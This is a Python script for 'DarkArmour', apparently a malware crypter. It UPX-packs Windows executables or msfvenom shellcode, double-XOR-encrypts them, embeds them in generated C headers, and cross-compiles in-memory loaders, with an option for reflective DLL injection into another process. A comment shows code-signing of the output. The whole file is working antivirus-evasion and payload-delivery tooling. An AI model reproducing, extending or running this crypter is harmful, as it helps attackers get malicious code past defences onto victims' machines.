#!/usr/bin/env python3

import os
import sys
import random
import string
import argparse

version     = "0.2"
FILETYPE    = None
PE_IMAGE    = None
OUT_NAME    = None
CRYPTKEY1   = None
CRYPTKEY2   = None
BINASRAW    = False
NULLBKEY    = None
UPXPACK     = True
RUNASDLL    = False
DLLIMAGE    = None
SCDLL       = False

"""
sudo apt install osslsigncode
osslsigncode sign -certs certs/cert.pem -key certs/key.pem -pass password -n "Application" -i http://www.google.com/ -in binary.exe -out binary-signed.exe
"""

def gen_rand_filename():
    name = ""
    for i in range(1, 10):
        name += random.choice(list(string.ascii_uppercase + string.ascii_lowercase))
    return name

def gen_rand_key():
    global CRYPTKEY1, CRYPTKEY2, NULLBKEY
    CRYPTKEY1 = random.randint(10, 100)
    CRYPTKEY2 = random.randint(10, 100)
    print(f"[+] Using keys {hex(CRYPTKEY1)}, {hex(CRYPTKEY2)}")

def gen_null_key():
    global NULLBKEY
    NULLBKEY = random.randint(17, 50)
    print(f"[+] Using null key {hex(NULLBKEY)}")

def get_file_as_hex(crypt, key, infile=None, data=None, data_length=None):
    bytes = ""
    if (infile != None) and (data == None):
        with open(infile, "rb") as file:
            data = file.read()
            data_len = len(data)
    else:
        data_len = data_length
    iter = 0
    for num, byte in enumerate(data):
        byte = hex(byte)
        if crypt:
            byte = hex(int(byte, 16) ^ key)
        else:
            if len(str(byte)) == 3:
                byte = str(byte).replace("0x", '')
                byte = f"0x0{byte}"
        iter += 1
        if num == data_len - 1:
            bytes += f"{str(byte)}"
            return bytes, data_len
        if iter == 16:
            bytes += f"{str(byte)},\n"
            iter = 0
            continue
        bytes += f"{str(byte)}, "

def prepare_pe_image(bytes_len, hex_bytes):
    global PE_IMAGE
    PE_IMAGE =  f"#define array_len {bytes_len}\n\n"
    PE_IMAGE += "unsigned long long image_crypt[] = {\n"
    PE_IMAGE += hex_bytes
    PE_IMAGE += "\n};"

def write_pe_image():
    global PE_IMAGE
    with open("lib/pe_image.h", "w") as file:
        file.write(PE_IMAGE)

def write_header_file(keys=True):
    HEADFILE = ""
    with open("lib/main.h", "w") as file:
        if keys:
            HEADFILE +=  f"#define key_one {hex(CRYPTKEY1)}\n"
            HEADFILE +=  f"#define key_two {hex(CRYPTKEY2)}\n"
            HEADFILE +=  f"#define null_key {hex(NULLBKEY)}\n"
        HEADFILE +=  "void RunFromMemory(char* pImage, char* pPath);"
        file.write(HEADFILE)

def compile_as_binary(outname, source, source2=None):
    if source2 is not None:
        os.system(f"i686-w64-mingw32-g++ {source} {source2} -o {outname} -static")
    else:
        os.system(f"i686-w64-mingw32-g++ {source} -o {outname} -static")

def strip_bin(infile):
    os.system(f"strip {infile} > /dev/null")
    return get_size(infile)

def get_size(filename):
    with open(filename, "rb") as file:
        length = len(file.read())
        return length

def pack_with_upx(file):
    name = gen_rand_filename() + ".exe"
    os.system(f"upx {file} -o {name} > /dev/null")
    print(f"[+] Packed {file} with upx, stored it in {name}")
    return name

def compile_as_dll(source1, source2=None):
    file = gen_rand_filename() + ".dll"
    reflect = "lib/ReflectiveDLLInjection/dll/"
    if source2 is not None:
        cmd = f"i686-w64-mingw32-g++ {source1} {reflect}ReflectiveLoader.c {source2} -o {file} -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN -DWIN_X86 -shared -static -w"
    if source2 is None:
         cmd = f"i686-w64-mingw32-g++ {source1} {reflect}ReflectiveLoader.c -o {file} -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN -DWIN_X86 -shared -static -w"
    os.system(cmd)
    return file

def write_dll_image():
    with open("lib/dll_image.h", "w") as file:
        file.write(DLLIMAGE)

def prepare_dll_image(bytes_len, hex_bytes):
    global DLLIMAGE
    DLLIMAGE =  f"#define array_len {bytes_len}\n\n"
    DLLIMAGE += "unsigned char *dll_image[] = {\n"
    DLLIMAGE += hex_bytes
    DLLIMAGE += "\n};"

def compile_dll_loader_as_pe(out_name, sourcefile):
    reflect_inject = "lib/ReflectiveDLLInjection/inject/"
    sources = f"{reflect_inject}GetProcAddressR.c {reflect_inject}LoadLibraryR.c"
    flags = "-O2 -DWIN_X86 -static -lwtsapi32 -w"

    cmd = f"i686-w64-mingw32-gcc {sources} {sourcefile} -o {OUT_NAME} {flags}"
    os.system(cmd)

def clean_file(file):
    os.unlink(file)

def clean_hex_output(hex_bytes):
    raw_crypt_bytes = b""
    for byte in hex_bytes.split():
        byte = byte.replace("0x", '')
        byte = byte.replace(",", '')
        if len(byte) == 1:
            byte = f"0{byte}"
        try:
            raw_crypt_bytes += bytes.fromhex(byte).encode('utf-8')
        except AttributeError:
            raw_crypt_bytes += bytes.fromhex(byte)
    return raw_crypt_bytes


def gen_shellcode_template(filename, hex_bytes, bytes_len):
    sc_template  = ""
    sc_template += f"#define array_len {bytes_len}\n"
    sc_template += "unsigned char shellcode[] = {\n"
    sc_template += hex_bytes
    sc_template += "};\n"
    with open(filename, "w") as file:
        file.write(sc_template)


def crypt(infile, shellcode=False, clean=False):
    if clean: file_to_clean = infile
    if shellcode == False:
        print(f"[+] Starting to crypt {infile} ({get_size(infile)} bytes)")

        if UPXPACK:
            infile = pack_with_upx(infile)
        else:
            length = strip_bin(infile)
            print(f"[+] Stripped {infile} down to {length} bytes")

        gen_null_key()
        if CRYPTKEY1 is None: gen_rand_key()
        hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY1, infile=infile)

        raw_crypt_bytes = clean_hex_output(hex_bytes)

        hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY2, infile=None, data=raw_crypt_bytes, data_length=bytes_len)
        prepare_pe_image(bytes_len, hex_bytes)
        write_pe_image()
        print("[+] Extracted bytes and created pe image")
        write_header_file()

        if RUNASDLL is False:
            compile_as_binary(OUT_NAME, "lib/exec_memory.cpp", source2="lib/pe_main.cpp")
            if UPXPACK is True:
                clean_file(infile)
            if clean: clean_file(file_to_clean)
            print(f"[*] Wrote {get_size(OUT_NAME)} bytes to PE {OUT_NAME}")
        elif RUNASDLL is True:
            dll_file = compile_as_dll("lib/dll_main.c", "lib/exec_memory.cpp")
            print(f"[+] Wrote {get_size(dll_file)} bytes to DLL {dll_file}")
            hex_bytes, bytes_len = get_file_as_hex(False, None, infile=dll_file)
            prepare_dll_image(bytes_len, hex_bytes)
            write_dll_image()
            compile_dll_loader_as_pe(OUT_NAME, "lib/dll_mem_exec.c")
            print(f"[*] Compiled the dll loader and wrote {get_size(OUT_NAME)} bytes to {OUT_NAME}")
    if shellcode:
        if RUNASDLL is True:
            gen_null_key()
            if CRYPTKEY1 is None: gen_rand_key()
            write_header_file()
            hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY1, infile=infile)
            raw_crypt_bytes = clean_hex_output(hex_bytes)
            hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY2, infile=None, data=raw_crypt_bytes, data_length=bytes_len)

            gen_shellcode_template("lib/shellcode_template.h", hex_bytes, bytes_len)
            dll_file = compile_as_dll("lib/dll_shellcode_dropper.c")
            print(f"[+] Wrote {get_size(dll_file)} bytes to DLL {dll_file}")
            hex_bytes, bytes_len = get_file_as_hex(False, None, infile=dll_file)
            prepare_dll_image(bytes_len, hex_bytes)
            write_dll_image()
            compile_dll_loader_as_pe(OUT_NAME, "lib/dll_mem_exec.c")
            clean_file(dll_file)
            print(f"[*] Compiled the dll injecting shellcode dropper and wrote {get_size(OUT_NAME)} bytes to {OUT_NAME}")
        else:
            if CRYPTKEY1 is None: gen_rand_key()
            gen_null_key()
            write_header_file()
            hex_bytes, bytes_len = get_file_as_hex(True, CRYPTKEY1, infile=infile)
            print(f"[+] Extracted shellcode from {infile} ({bytes_len} bytes)")
            gen_shellcode_template("lib/shellcode_template.h", hex_bytes, bytes_len)
            print(f"[+] Created dropper template")
            temp_out_name = gen_rand_filename() + ".exe"
            compile_as_binary(temp_out_name, "lib/shellcode_dropper.c")
            print(f"[+] Compiled shellcode dropper and wrote {get_size(temp_out_name)} bytes to {temp_out_name}")
            crypt(temp_out_name, clean=True)


if __name__ == '__main__':
    ap = argparse.ArgumentParser()

    print(f"DarkArmour by Dylan Halls (v{version})\n")

    ap.add_argument("-f", "--file", required=False, help="file to crypt, assumed as binary if not told otherwise")
    ap.add_argument("-S", "--shellcode", required=False, help="file contating the shellcode, needs to be in the 'msfvenom -f raw' style format")
    ap.add_argument("-b", "--binary", required=False, action='store_true', help="provide if file is a binary exe")
    ap.add_argument("-d", "--dll", required=False, action='store_true', help="use reflective dll injection to execute the binary inside another process")
    ap.add_argument("-s", "--source", required=False, action='store_true', help="provide if the file is c source code")
    ap.add_argument("-r", "--raw", required=False, action='store_true', help="store binary in memory without encrypting")
    ap.add_argument("-k", "--key", required=False, help="key to encrypt with, randomly generated if not supplied")
    ap.add_argument("-o", "--outfile", required=True, help="name of outfile, if not provided then random filename is assigned")

    args = vars(ap.parse_args())

    if (args['binary'] and args['source']) is None:
        FILETYPE = "binary"
    else:
        if args['binary'] is not None: FILETYPE = 'binary'
        if args['source'] is not None: FILETYPE = 'source'

    if args['outfile'] is None:
        OUT_NAME = gen_rand_filename()
    else:
        OUT_NAME = args['outfile']

    if args['key'] is not None:
        CRYPTKEY1 = hex(args['key'])

    if args['raw'] is not False: BINASRAW = True
    if args['dll'] is not False: RUNASDLL = True

    if args["shellcode"] is not None:
        crypt(args["shellcode"], shellcode=True)
    else:
        crypt(args["file"])
